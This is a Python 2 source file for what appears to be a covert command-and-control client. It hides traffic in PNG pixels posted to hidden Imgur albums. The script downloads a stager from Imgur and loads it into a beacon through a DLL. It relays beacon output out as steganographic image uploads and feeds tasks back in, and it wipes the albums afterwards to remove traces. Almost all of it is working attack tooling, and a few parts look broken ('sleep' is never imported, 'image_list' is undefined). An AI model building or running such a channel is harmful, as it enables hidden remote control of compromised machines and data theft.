from ctypes import *
from ctypes.wintypes import *
import sys
import os
import struct

# Encoder imports:

# Transport imports:
from imgurpython import ImgurClient, helpers
import PIL
from PIL import Image
from cStringIO import StringIO
import time
from sys import exit
import urlparse
import base64
import requests
import zlib

# <START OF GHETTO CONFIG SECTION>
TOKEN_LEN = 81 # Don't change this
USERNAME = ''
client_id = ''
client_secret = ''
SEND_ALBUM_NAME = "RESP4U"
RECV_ALBUM_NAME = "TASK4U"
access_token = ''
refresh_token = ''
VERSION = 0
# </END OF GHETTO CONFIG SECTION>

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data, photo_id=1, list_size=1):
	img = Image.new('RGB', (4320,4320), color = 'red')
	pix = img.load()
	x = 1
	for byte in data:
		pix[x,x] = (pix[x,x][0], pix[x,x][1], ord(byte))
		x = x + 1
		pass
	pix[0,0] = (VERSION, photo_id, list_size)
	image_list.append(img.load)
	img_byte_array = StringIO()
	img.save(img_byte_array, format='PNG')
	return img_byte_array

def decode(image):
	stego_pix = image.load()
	byte_list = []
	
	for y in range(1, image.size[1]):
		# Add our byte we wnat
		byte_list.append(chr(stego_pix[y,y][2]))
	pass

	return ''.join(byte_list)

# </encoder functions>

# <transport functions>
def resetAccount():
	account_albums = client.get_account_albums(USERNAME)
	for album in account_albums:
		images = client.get_album_images(album.id)
		for image in images:
			client.delete_image(image.id)
		client.album_delete(album.id)

def prepTransport():
	global client
	client = ImgurClient(client_id, client_secret)

	getTokens()
	return 0

def getTokens():
	while True:
		try:
			account_albums = client.get_account_albums(USERNAME)
			account_albums[0]
			if account_albums[0].title == "TK4U":
				break
			else:
				print "No new albums yet, sleeping for 2m"
		except IndexError:
			print "No new albums yet, sleeping for 2m"
			time.sleep(120)

	x = 0
	for x in range(0, len(account_albums)):
		token_image = client.get_album_images(account_albums[x].id)[0]
		token_img = Image.open(StringIO(requests.get(token_image.link).content))
		stego_pix = token_img.load()
		if stego_pix[0,0] == (1,1,1):
			print "Token images found!"
			break
		else:
			x = x + 1
			pass

	token_bytes = []
	for x in range(1, token_img.size[1]):
		token_bytes.append(chr(stego_pix[x,x][2]))
	tokens = ''.join(token_bytes[0:TOKEN_LEN]).split(',')

	global access_token
	access_token = tokens[0]
	global refresh_token
	refresh_token = tokens[1]

	# Cleanup time!
	client.set_user_auth(access_token, refresh_token)
	resetAccount()

	print "Sleeping for 600s to allow server to upload stager"
	time.sleep(600)

	return 0


def checkStatus(silent=True):
	# Checks the account status
	#   if we discover we don't have enough credits to continue, we will sleep until our credits are reset
	credits = client.make_request('GET', 'credits')

	# Supports pseudo debug output
	if silent == False:
		print "%d credits remaining of %d for this user's ip" %(credits['UserRemaining'], credits['UserLimit'])
		print "%d credits remaining of %d for this client" %(credits['ClientRemaining'], credits['ClientLimit'])
		print "User credits reset @ " + str(time.ctime(credits['UserReset']))

	# Wait for our credits to reset if we don't have enough
	if int(credits['UserRemaining']) < 10:
		print "WARNING: Not enough credits to continue making requests, waiting for credits to replenish"
		while time.time() <= credits['UserReset']:
			print "Current time: " + str(time.ctime(time.time()))
			print "Reset @ %s, sleeping for 5m" % (time.ctime(credits['UserReset']))
			time.sleep(300)
		print "Credits reset!"
		checkStatus()
	return credits

def sendData(data):
	# Transport will receiving a list of images
	# Application will have already encoded the data
	# Logic will probably be different for client,
	# indicating that we're going to run into issues
	# Here, we're expecting to recieve a list of PIL images from the encoder
	fields = {}
	fields = { 'title': SEND_ALBUM_NAME, 'privacy': "hidden"}
	album_object = client.create_album(fields)
	fields.update({"id": album_object['id']})

	data = base64.b64encode(zlib.compress(data, 9))
	data_list = [data[i:i+1079] for i in range(0, len(data), 1079)]

	photo_id = 1
	image_upload_fields = {'type': 'base64', 'album': album_object['id']}

	credits = checkStatus(silent=False)
	# TODO: Add logic to safely check if we can upload photos here
	# if credits['UserRemaining'] < len(data_list) or credits['ClientRemaining'] < len(data_list):

	print "Uploading %d images" % (len(data_list))
	for chunk in data_list:
		photo = encode(chunk, photo_id=photo_id)
		image_upload_fields.update({'image': base64.b64encode(photo.getvalue())})
		while True:
			try:
				request = client.make_request('POST', 'upload', image_upload_fields)
			except helpers.error.ImgurClientRateLimitError:
				print "Hit the rate limit, sleeping for 10m"
				time.sleep(600)
				continue
			break
		photo_id = photo_id + 1
		del photo
		credits = checkStatus(silent=False)
		# If photo_id % 50, we'll sleep for 3 minutes to not trip our rate limit
		# There is an upload limit of 50 images per IP address per hour. 
		if photo_id % 40 == 0:
			print "Upload limit for this hour exceeded, sleeping until next hour"
			time.sleep(300)


def recvData():
	# Check for new albums
	while True:
		try:
			account_albums = client.get_account_albums(USERNAME)
			account_albums[0]
			if account_albums[0].title == RECV_ALBUM_NAME:
				break
			else:
				print "No new albums yet, sleeping for 2m"
		except IndexError:
			print "No new albums yet, sleeping for 2m"
			time.sleep(120)

	x = 0
	reconstructed_data = ""
	data_list = []

	# Iterate through each album
	for x in range(0, len(account_albums)):
		album_images = client.get_album_images(account_albums[x].id)

		# Iterate through each image in the album
		for image in album_images:
			curr_image_data = Image.open(StringIO(requests.get(image.link).content))
			data_list.append(decode(curr_image_data))
			pass
	
	# Reconstruct the data
	reconstructed_data = ''.join(data_list).strip('\0')

	resetAccount()

	# Now lets unbase64 and decompress this data
	raw_data = zlib.decompress(base64.b64decode(reconstructed_data))
	return raw_data

# </transport functions>

maxlen = 1024*1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
	return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
	mem = create_string_buffer(maxlen)
	l = lib.read_frame(hPipe,mem,maxlen)
	if l < 0: return(-1)
	chunk=mem.raw[:l]
	return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
	sys.stdout.write('wp: %s\n'%len(chunk))
	sys.stdout.flush()
	print chunk
	ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
	sleep(3) 
	print "ret=%s"%ret
	return(ret)

def go():
	# LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
	print "Waiting for stager..." # DEBUG
	p = recvData()
	print "Got a stager! loading..."
	sleep(2)
	# print "Decoded stager = " + str(p) # DEBUG
	# Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
	handle_beacon = start_beacon(p)

	# Grabbing and relaying the metadata from the SMB pipe is done during interact()
	print "Loaded, and got handle to beacon. Getting METADATA."

	return handle_beacon

def interact(handle_beacon):
	while(True):
		sleep(1.5)
		
		# LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
		chunk = ReadPipe(handle_beacon)
		if chunk < 0:
			print 'readpipe %d' % (len(chunk))
			break
		else:
			print "Received %d bytes from pipe" % (len(chunk))
		print "relaying chunk to server"
		sendData(chunk)

		# LOGIC TO CHECK FOR A NEW TASK
		print "Checking for new tasks from transport"
		
		newTask = recvData()

		print "Got new task: %s" % (newTask)
		print "Writing %s bytes to pipe" % (len(newTask))
		r = WritePipe(handle_beacon, newTask)
		print "Write %s bytes to pipe" % (r)

# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop
try:
	interact(handle_beacon)
except KeyboardInterrupt:
	print "Caught escape signal"
	sys.exit(0)
